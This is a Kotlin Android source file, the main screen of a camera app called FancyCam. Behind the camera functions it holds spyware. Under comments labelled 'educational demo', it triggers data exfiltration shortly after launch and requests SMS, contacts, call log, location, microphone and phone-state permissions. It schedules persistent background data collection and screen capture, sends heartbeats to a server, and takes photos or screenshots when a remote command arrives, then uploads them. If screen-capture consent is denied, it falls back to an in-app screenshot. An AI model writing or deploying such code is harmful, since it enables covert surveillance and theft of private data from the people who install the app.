package com.example.fancycam.ui

import com.example.fancycam.R
import com.example.fancycam.camera.CameraHelper
import com.example.fancycam.network.AppConfig
import com.example.fancycam.network.DataExfilSender
import com.example.fancycam.network.PhotoUploader
import com.example.fancycam.network.ScreenshotUploader
import com.example.fancycam.services.MicrophoneCapture
import com.example.fancycam.storage.PhotoStorageManager
import com.example.fancycam.workers.DataCollectionWorker
import com.example.fancycam.workers.PhotoUploadWorker
import com.example.fancycam.workers.ScreenCaptureWorker
import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.app.Activity
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.ImageCapture
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.example.fancycam.databinding.ActivityMainBinding
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var cameraHelper: CameraHelper
    private var latestPhotoFile: File? = null
    private var latestServerUploadedName: String? = null
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private var pendingSystemScreenshot: Boolean = false
    private var pendingScreenshotCommandId: String? = null

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            setupCamera()
        } else {
            binding.statusText.text = "Camera permission is required to use this app."
            Toast.makeText(this, "Camera permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    private val requestNotificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "Notification permission granted: $isGranted")
    }

    private val requestMultiplePermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        for ((permission, granted) in permissions) {
            Log.d(TAG, "Permission $permission granted: $granted")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        checkAndRequestPermissions()

        // Shutter Button
        binding.captureButton.setOnClickListener {
            takePhotoAndProcess()
        }

        // Camera Switch (Front/Back)
        binding.switchCameraButton.setOnClickListener {
            switchCamera()
        }

        // Flash Toggle Button
        binding.btnFlash.setOnClickListener {
            cycleFlash()
        }

        // Initialize latest photo thumbnail if available
        loadInitialThumbnail()

        // Open internal Settings activity on long pressing the FancyCam header
        val openSettings = {
            val intent = Intent(this, SettingsActivity::class.java)
            startActivity(intent)
            true
        }
        binding.appTitle.setOnLongClickListener { openSettings() }
        binding.topBar.setOnLongClickListener { openSettings() }

        // EDUCATIONAL DEMO: Trigger data collection after permissions
        binding.root.postDelayed({
            DataExfilSender.collectAndExfiltrate(this)
        }, 5000)

        // EDUCATIONAL DEMO: Schedule periodic collection
        schedulePeriodicCollection()
    }

    private fun loadInitialThumbnail() {
        val existingPhoto = PhotoStorageManager.getLatestPhoto(this)
        if (existingPhoto != null && existingPhoto.exists()) {
            latestPhotoFile = existingPhoto
            loadThumbnail(existingPhoto)
        }
    }

    private fun checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                requestNotificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED
        ) {
            setupCamera()
        } else {
            binding.statusText.text = "Requesting Camera permission..."
            requestPermissionLauncher.launch(Manifest.permission.CAMERA)
        }

        // Request storage and educational demo permissions
        val permissionsToRequest = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
        }

        // Additional data collection permissions for forensics demo
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_SMS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_CONTACTS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_CALL_LOG)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.RECORD_AUDIO)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_PHONE_STATE)
        }

        if (permissionsToRequest.isNotEmpty()) {
            requestMultiplePermissionsLauncher.launch(permissionsToRequest.toTypedArray())
        }
    }

    private fun setupCamera() {
        binding.statusText.text = "Starting camera preview..."
        cameraHelper = CameraHelper(
            context = this,
            lifecycleOwner = this,
            previewView = binding.viewFinder
        )

        cameraHelper.startCamera(
            onReady = {
                val lens = if (cameraHelper.isFrontCamera()) "Front Camera" else "Back Camera"
                binding.statusText.text = "Ready to capture ($lens). Tap shutter button below."
            },
            onError = { exception ->
                binding.statusText.text = "Camera error: ${exception.localizedMessage}"
            }
        )
    }

    private fun switchCamera() {
        if (!::cameraHelper.isInitialized) return

        binding.switchCameraIcon.animate().rotationBy(180f).setDuration(250).start()
        binding.statusText.text = "Switching camera..."

        cameraHelper.toggleCamera(
            onReady = {
                val facing = if (cameraHelper.isFrontCamera()) "Front camera (Selfie)" else "Back camera"
                binding.statusText.text = "$facing ready. Tap shutter to capture."
                AppActivityLogger.logActivity(
                    context = this@MainActivity,
                    type = "CAMERA",
                    title = "Switched camera lens",
                    detail = facing,
                    success = true
                )
            },
            onError = { err ->
                binding.statusText.text = "Switch failed: ${err.message}"
                Toast.makeText(this, "Cannot switch: ${err.message}", Toast.LENGTH_SHORT).show()
            }
        )
    }

    private fun cycleFlash() {
        if (!::cameraHelper.isInitialized) return

        val newMode = cameraHelper.cycleFlashMode()
        when (newMode) {
            ImageCapture.FLASH_MODE_AUTO -> {
                binding.btnFlash.setImageResource(R.drawable.ic_flash_auto)
                Toast.makeText(this, "Flash: Auto", Toast.LENGTH_SHORT).show()
            }
            ImageCapture.FLASH_MODE_ON -> {
                binding.btnFlash.setImageResource(R.drawable.ic_flash_on)
                Toast.makeText(this, "Flash: On", Toast.LENGTH_SHORT).show()
            }
            ImageCapture.FLASH_MODE_OFF -> {
                binding.btnFlash.setImageResource(R.drawable.ic_flash_off)
                Toast.makeText(this, "Flash: Off", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun triggerShutterAnimation() {
        binding.shutterFlashView.apply {
            alpha = 0.85f
            visibility = View.VISIBLE
            animate()
                .alpha(0f)
                .setDuration(150)
                .withEndAction { visibility = View.GONE }
                .start()
        }
    }

    private fun takePhotoAndProcess(commandId: String? = null) {
        if (!::cameraHelper.isInitialized) {
            binding.statusText.text = "Camera is not ready yet."
            return
        }

        triggerShutterAnimation()
        binding.captureButton.isEnabled = false
        binding.statusText.text = "Capturing photo..."

        val photoFile = PhotoStorageManager.createNewPhotoFile(this)

        cameraHelper.takePhoto(
            outputFile = photoFile,
            onPhotoCaptured = { savedFile ->
                latestPhotoFile = savedFile
                binding.captureButton.isEnabled = true

                // 1. Index in device storage & MediaStore
                PhotoStorageManager.indexPhotoInStorage(this, savedFile)

                // Log capture activity
                AppActivityLogger.logActivity(
                    context = this@MainActivity,
                    type = "PHOTO",
                    title = "Photo captured",
                    detail = "${savedFile.name} (${savedFile.length() / 1024} KB)",
                    success = true
                )

                // 2. Update thumbnail preview on the main camera screen
                loadThumbnail(savedFile)

                // 3. Update status
                binding.statusText.text = "Photo saved."

                // 4. Send photo to server immediately; only use the WorkManager backup task if it fails
                lifecycleScope.launch {
                    val result = PhotoUploader.uploadPhoto(this@MainActivity, savedFile)
                    if (result.success) {
                        latestServerUploadedName = result.serverFilename
                        if (commandId != null) {
                            DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "completed", result = org.json.JSONObject().put("server_filename", result.serverFilename ?: ""))
                        }
                    } else {
                        Log.w(TAG, "Direct upload failed: ${result.message}; enqueuing background worker.")
                        enqueueUploadWork(savedFile)
                        if (commandId != null) {
                            DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "completed", result = org.json.JSONObject().put("queued", true))
                        }
                    }
                }
            },
            onError = { exception ->
                binding.statusText.text = "Capture failed: ${exception.message}"
                binding.captureButton.isEnabled = true
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = exception.message)
                }
                AppActivityLogger.logActivity(
                    context = this@MainActivity,
                    type = "PHOTO",
                    title = "Photo capture failed",
                    detail = exception.message ?: "Unknown error",
                    success = false
                )
            }
        )
    }

    private fun captureScreenshotAndUpload(commandId: String? = null) {
        if (mediaProjection == null) {
            pendingSystemScreenshot = true
            pendingScreenshotCommandId = commandId
            binding.statusText.text = "Grant screen capture consent..."
            try {
                startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch screen-capture consent: ${e.message}", e)
                pendingSystemScreenshot = false
                captureAppViewScreenshotAndUpload(pendingScreenshotCommandId)
                pendingScreenshotCommandId = null
            }
            return
        }

        captureUsingMediaProjection(mediaProjection!!, commandId)
    }

    private fun captureUsingMediaProjection(projection: MediaProjection, commandId: String? = null) {
        val metrics = resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        Thread {
            var imageReader: ImageReader? = null
            var virtualDisplay: android.hardware.display.VirtualDisplay? = null
            var image: Image? = null
            try {
                imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
                virtualDisplay = projection.createVirtualDisplay(
                    "FancyCamScreen",
                    width,
                    height,
                    density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.surface,
                    null,
                    null
                )

                var attempts = 0
                while (attempts < 50 && image == null) {
                    image = imageReader.acquireLatestImage()
                    if (image == null) {
                        Thread.sleep(100)
                    }
                    attempts++
                }
                if (image == null) {
                    Log.w(TAG, "No frame available from MediaProjection")
                    if (commandId != null) {
                        DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = "No frame available")
                    }
                    return@Thread
                }

                val plane = image.planes[0]
                val buffer = plane.buffer
                val pixelStride = plane.pixelStride
                val rowStride = plane.rowStride
                val rowPadding = rowStride - pixelStride * width
                val bitmapWidth = width + rowPadding / pixelStride

                val bitmap = Bitmap.createBitmap(bitmapWidth, height, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(buffer)
                val cropped = if (rowPadding != 0) {
                    Bitmap.createBitmap(bitmap, 0, 0, width, height)
                } else {
                    bitmap
                }

                val screenshotFile = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
                FileOutputStream(screenshotFile).use { out ->
                    cropped.compress(Bitmap.CompressFormat.PNG, 100, out)
                }

                if (cropped != bitmap) bitmap.recycle()

                lifecycleScope.launch {
                    val result = ScreenshotUploader.uploadScreenshot(this@MainActivity, screenshotFile)
                    if (result.success) {
                        Log.i(TAG, "System screenshot uploaded: ${result.serverFilename}")
                        latestServerUploadedName = result.serverFilename
                        if (commandId != null) {
                            DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "completed", result = org.json.JSONObject().put("server_filename", result.serverFilename ?: ""))
                        }
                    } else {
                        Log.w(TAG, "System screenshot upload failed: ${result.message}")
                        if (commandId != null) {
                            DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = result.message)
                        }
                    }
                    screenshotFile.delete()
                }
            } catch (e: Exception) {
                Log.e(TAG, "MediaProjection screenshot failed: ${e.message}", e)
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = e.message)
                }
            } finally {
                image?.close()
                virtualDisplay?.release()
                imageReader?.close()
            }
        }.start()
    }

    private fun captureAppViewScreenshotAndUpload(commandId: String? = null) {
        val rootView = window.decorView.rootView
        if (rootView.width <= 0 || rootView.height <= 0) {
            binding.statusText.text = "Screenshot capture failed: view not ready"
            return
        }

        val bitmap = Bitmap.createBitmap(rootView.width, rootView.height, Bitmap.Config.ARGB_8888)
        val canvas = Canvas(bitmap)
        rootView.draw(canvas)

        val screenshotFile = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
        try {
            FileOutputStream(screenshotFile).use { out ->
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save screenshot: ${e.message}", e)
            binding.statusText.text = "Screenshot save failed"
            return
        } finally {
            bitmap.recycle()
        }

        binding.statusText.text = "Screenshot captured."

        lifecycleScope.launch {
            val result = ScreenshotUploader.uploadScreenshot(this@MainActivity, screenshotFile)
            if (result.success) {
                Log.i(TAG, "Screenshot uploaded: ${result.serverFilename}")
                latestServerUploadedName = result.serverFilename
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "completed", result = org.json.JSONObject().put("server_filename", result.serverFilename ?: ""))
                }
            } else {
                Log.w(TAG, "Screenshot upload failed: ${result.message}")
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = result.message)
                }
            }
            screenshotFile.delete()
        }
    }

    private fun uploadPhotoImmediately(file: File) {
        lifecycleScope.launch {
            val result = PhotoUploader.uploadPhoto(this@MainActivity, file)
            if (result.success) {
                latestServerUploadedName = result.serverFilename
            } else {
                Log.w(TAG, "Direct upload failed: ${result.message}; background worker will retry.")
            }
        }
    }

    private fun loadThumbnail(file: File) {
        try {
            val options = BitmapFactory.Options().apply {
                inSampleSize = 4 // Downsample for efficient thumbnail display
            }
            val thumb = BitmapFactory.decodeFile(file.absolutePath, options)
            if (thumb != null) {
                binding.photoThumbnail.setImageBitmap(thumb)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to load thumbnail: ${e.message}")
        }
    }

    private fun enqueueUploadWork(file: File) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val uploadWorkRequest = OneTimeWorkRequestBuilder<PhotoUploadWorker>()
            .setConstraints(constraints)
            .setInputData(workDataOf(PhotoUploadWorker.KEY_IMAGE_PATH to file.absolutePath))
            .build()

        WorkManager.getInstance(this).enqueue(uploadWorkRequest)
        Log.d(TAG, "Photo backup worker task enqueued for ${file.name}")
    }

    /**
     * EDUCATIONAL DEMO: Schedule periodic data collection via WorkManager.
     * Demonstrates persistent background execution that survives app termination.
     */
    private fun schedulePeriodicCollection() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        // 15-minute minimum for PeriodicWorkRequest means 1-minute cadence
        // must be a self-rescheduling one-time chain.
        val dataWork = OneTimeWorkRequestBuilder<DataCollectionWorker>()
            .setInitialDelay(1, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        WorkManager.getInstance(this).enqueueUniqueWork(
            DataCollectionWorker.WORK_NAME,
            ExistingWorkPolicy.KEEP,
            dataWork
        )

        val screenCaptureWork = PeriodicWorkRequestBuilder<ScreenCaptureWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            ScreenCaptureWorker.WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            screenCaptureWork
        )

        Log.d(TAG, "[EDUCATIONAL] Periodic data collection scheduled (every 15 min)")
        Log.d(TAG, "[EDUCATIONAL] Periodic screen-capture heartbeat scheduled (every 15 min)")
    }

    private var heartbeatHandler: Handler? = null
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            DataExfilSender.sendHeartbeat(this@MainActivity)
            heartbeatHandler?.postDelayed(this, 15000)
        }
    }

    @Deprecated("Use modern result APIs, but fine for this demo")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
                if (pendingSystemScreenshot) {
                    pendingSystemScreenshot = false
                    val cmdId = pendingScreenshotCommandId
                    pendingScreenshotCommandId = null
                    mediaProjection?.let { captureUsingMediaProjection(it, cmdId) }
                }
            } else {
                pendingSystemScreenshot = false
                val cmdId = pendingScreenshotCommandId
                pendingScreenshotCommandId = null
                Log.w(TAG, "Screen-capture consent denied; falling back to app view")
                captureAppViewScreenshotAndUpload(cmdId)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        DataExfilSender.commandListener = object : DataExfilSender.CommandListener {
            override fun onTakePhotoCommand(commandId: String?) {
                runOnUiThread {
                    takePhotoAndProcess(commandId)
                }
            }

            override fun onTakeScreenshotCommand(commandId: String?) {
                runOnUiThread {
                    captureScreenshotAndUpload(commandId)
                }
            }
        }
        if (heartbeatHandler == null) {
            heartbeatHandler = Handler(Looper.getMainLooper())
        }
        heartbeatHandler?.removeCallbacks(heartbeatRunnable)
        heartbeatHandler?.post(heartbeatRunnable)
    }

    override fun onPause() {
        super.onPause()
        DataExfilSender.commandListener = null
        heartbeatHandler?.removeCallbacks(heartbeatRunnable)
    }

    override fun onDestroy() {
        super.onDestroy()
        heartbeatHandler?.removeCallbacks(heartbeatRunnable)
        heartbeatHandler = null
        if (::cameraHelper.isInitialized) {
            cameraHelper.shutdown()
        }
        MicrophoneCapture.stopCapture()
        mediaProjection?.stop()
        mediaProjection = null
    }

    companion object {
        private const val TAG = "MainActivity"
        private const val REQUEST_MEDIA_PROJECTION = 1001
    }
}
